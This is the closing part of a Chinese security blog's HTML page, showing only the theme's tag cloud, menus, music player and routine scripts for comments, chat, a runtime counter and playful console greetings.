0.88rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 0.88rem;">Chrome<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 0.88rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>6</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">JS逆向<sup>2</sup></a><a href="/tags/LLM/" style="font-size: 0.88rem;">LLM<sup>1</sup></a><a href="/tags/NAS/" style="font-size: 0.88rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/Prompt/" style="font-size: 0.88rem;">Prompt<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>19</sup></a><a href="/tags/TLS/" style="font-size: 0.88rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 0.88rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 0.88rem;">draft<sup>5</sup></a><a href="/tags/esxi/" style="font-size: 0.88rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 0.88rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 0.88rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 0.88rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" style="font-size: 0.88rem;">人工智能<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>16</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 0.88rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 0.88rem;">密码<sup>8</sup></a><a href="/tags/%E6%8F%90%E7%A4%BA%E8%AF%8D/" style="font-size: 0.88rem;">提示词<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 0.88rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 0.88rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 0.88rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 0.88rem;">证书<sup>1</sup></a><a href="/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">软件开发<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8923547078" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8923547078&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/js/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("12/01/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎来到My Blog!`,
    `生活明朗, 万物可爱`,
    `
    ████████╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗███████╗
    ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║ ██╔╝██╔════╝
       ██║   ███████║█████╔╝ ███████║█████╔╝ █████╗  
       ██║   ██╔══██║██╔═██╗ ██╔══██║██╔═██╗ ██╔══╝  
       ██║   ██║  ██║██║  ██╗██║  ██║██║  ██╗███████╗
       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        `,
    "已上线",
    dnum,
    "天",
    "©2022 By Takake V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【骇客】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
        img.title = "下班玩人工智能，嘿嘿~";
        img.alt = "下班玩人工智能，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "vister@takake.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
  const isChatBtn = false
  const isChatHideShow = false

  if (isChatBtn) {
    const close = () => {
      Chatra('minimizeWidget')
      Chatra('hide')
    }

    const open = () => {
      Chatra('openChat', true)
      Chatra('show')
    }

    window.ChatraSetup = {
      startHidden: true
    }
  
    window.chatBtnFn = () => {
      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
      isShow ? close() : open()
    }
  } else if (isChatHideShow) {
    window.chatBtn = {
      hide: () => {
        Chatra('hide')
      },
      show: () => {
        Chatra('show')
      }
    }
  }

  (function(d, w, c) {
    w.ChatraID = 'MYtmap9meYHQGdDTJ'
    var s = d.createElement('script')
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments)
    }
    s.async = true
    s.src = 'https://call.chatra.io/chatra.js'
    if (d.head) d.head.appendChild(s)
  })(document, window, 'Chatra')

})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>